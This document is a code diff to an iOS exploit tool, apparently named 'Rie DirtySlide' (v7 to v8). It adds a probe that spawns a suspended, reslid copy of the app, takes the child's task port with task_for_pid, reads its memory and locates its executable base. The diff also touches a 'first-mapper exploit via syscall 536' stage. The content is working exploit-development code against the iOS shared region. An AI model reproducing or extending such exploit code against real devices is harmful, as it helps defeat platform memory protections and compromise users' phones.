@@ -22,6 +22,7 @@
 #import <fcntl.h>
 #import <sys/mman.h>
 #import <sys/stat.h>
+#import <sys/wait.h>
 #import <spawn.h>
 
 // ── Rie types (same as reference exploit sr_cfg.h) ──
@@ -142,7 +143,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v7 ==="];
+    [self log:@"=== Rie DirtySlide v8 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -306,12 +307,122 @@ typedef struct {
             w += vs;
         }
     }
+
+    // Test child spawn viability
+    [self probeChildSpawn];
 }
 
-// ── Stage 3: First-mapper exploit via syscall 536 (v7: fixed sub-cache lookup) ──
+// ── Probe: test posix_spawn(RESLIDE+SUSPENDED) + task_for_pid viability ──
+- (void)probeChildSpawn {
+    [self log:@"\n── Testing child spawn + task_for_pid... ──"];
+
+    // Get our own binary path
+    NSString *ownPath = [[NSBundle mainBundle] executablePath];
+    [self log:[NSString stringWithFormat:@"self: %@", ownPath]];
+
+    pid_t pid = -1;
+    posix_spawnattr_t attr;
+    posix_spawnattr_init(&attr);
+    // Set flags: RESLIDE + START_SUSPENDED
+    short flags = _POSIX_SPAWN_RESLIDE | POSIX_SPAWN_START_SUSPENDED;
+    int rc = posix_spawnattr_setflags(&attr, flags);
+    [self log:[NSString stringWithFormat:@"posix_spawnattr_setflags(0x%x): rc=%d", flags, rc]];
+
+    if (rc != 0) {
+        [self log:@"!! posix_spawnattr_setflags failed — flags not supported on iOS?"];
+        posix_spawnattr_destroy(&attr);
+        return;
+    }
+
+    char *args[] = { (char *)[ownPath UTF8String], "--rie-child", NULL };
+    rc = posix_spawn(&pid, [ownPath UTF8String], NULL, &attr, args, NULL); // NULL env = inherit
+    posix_spawnattr_destroy(&attr);
+
+    if (rc != 0) {
+        [self log:[NSString stringWithFormat:@"!! posix_spawn failed: %s (errno=%d)", strerror(rc), rc]];
+        [self log:@"Child spawn not available — need alternative approach"];
+        return;
+    }
+
+    [self log:[NSString stringWithFormat:@"spawned child pid=%d (SUSPENDED+RESLIDE)", pid]];
+
+    // Try task_for_pid
+    task_t childTask = TASK_NULL;
+    kern_return_t kr = task_for_pid(mach_task_self(), pid, &childTask);
+    if (kr != KERN_SUCCESS) {
+        [self log:[NSString stringWithFormat:@"!! task_for_pid(%d): %s (0x%x) — need get-task-allow", pid, mach_error_string(kr), kr]];
+        kill(pid, SIGKILL);
+        waitpid(pid, NULL, 0);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"task_for_pid(%d): OK task=%d", pid, childTask]];
+
+    // Try to get threads
+    thread_act_array_t threads = NULL;
+    mach_msg_type_number_t n = 0;
+    kr = task_threads(childTask, &threads, &n);
+    if (kr != KERN_SUCCESS || n < 1) {
+        [self log:[NSString stringWithFormat:@"!! task_threads: %s n=%u", mach_error_string(kr), n]];
+        kill(pid, SIGKILL);
+        waitpid(pid, NULL, 0);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"task_threads: OK n=%u", n]];
+
+    // Get VM read func for child memory access
+    Rie_VMReadOverwriteFn vmr_local = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+    Rie_VMRegionRecurseFn vrr2 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
+
+    // Try to read child's memory — try shared region start
+    if (vmr_local) {
+        uint8_t tbuf[4096];
+        mach_vm_size_t got = 0;
+        kr = vmr_local(childTask, 0x180000000ULL, 4096, (rie_mach_vm_address_t)(uintptr_t)tbuf, &got);
+        if (kr == KERN_SUCCESS) {
+            [self log:[NSString stringWithFormat:@"mach_vm_read(child, 0x180000000): OK got=%llu", got]];
+        } else {
+            [self log:[NSString stringWithFormat:@"mach_vm_read(child, 0x180000000): %s (0x%x)",
+                mach_error_string(kr), kr]];
+        }
+    }
+
+    // Try to find child's exec base (find MH_EXECUTE)
+    if (vrr2 && vmr_local) {
+        rie_mach_vm_address_t caddr = 0;
+        rie_mach_vm_size_t csize = 0;
+        natural_t cdepth = 0;
+        for (int ci = 0; ci < 20; ci++) {
+            rie_vm_region_info_t cinfo; memset(cinfo, 0, sizeof(cinfo));
+            mach_msg_type_number_t ccnt = sizeof(cinfo)/sizeof(natural_t);
+            kr = vrr2(childTask, &caddr, &csize, &cdepth, (rie_vm_region_recurse_info_t)cinfo, &ccnt);
+            if (kr != KERN_SUCCESS) break;
+            if (csize < 0x1000) { caddr += csize; continue; }
+            uint32_t chdr[4] = {0};
+            mach_vm_size_t cgot = 0;
+            if (vmr_local(childTask, caddr, sizeof(chdr),
+                    (rie_mach_vm_address_t)(uintptr_t)chdr, &cgot) == KERN_SUCCESS &&
+                cgot == sizeof(chdr) && chdr[0] == MH_MAGIC_64 && chdr[3] == MH_EXECUTE) {
+                [self log:[NSString stringWithFormat:@"child exec base: 0x%llx", (unsigned long long)caddr]];
+                break;
+            }
+            caddr += csize;
+        }
+    }
+
+    // Cleanup: kill child
+    kill(pid, SIGKILL);
+    int status = 0;
+    waitpid(pid, &status, 0);
+    [self log:[NSString stringWithFormat:@"child cleaned up (exit=%d signal=%d)",
+        WIFEXITED(status) ? WEXITSTATUS(status) : -1,
+        WIFSIGNALED(status) ? WTERMSIG(status) : 0]];
+    [self log:@"\n*** Child spawn + task_for_pid: VIABLE! Two-process model works! ***"];
+}
+
+// ── Stage 3: First-mapper exploit via syscall 536 (v8: child spawn probe) ──
 - (void)runFirstMapper {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"\n── Stage 3: Rie v7 First-Mapper ──"];
+        [self log:@"\n── Stage 3: Rie v8 First-Mapper ──"];
         [self clearRelaunchFlag];
 
         long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
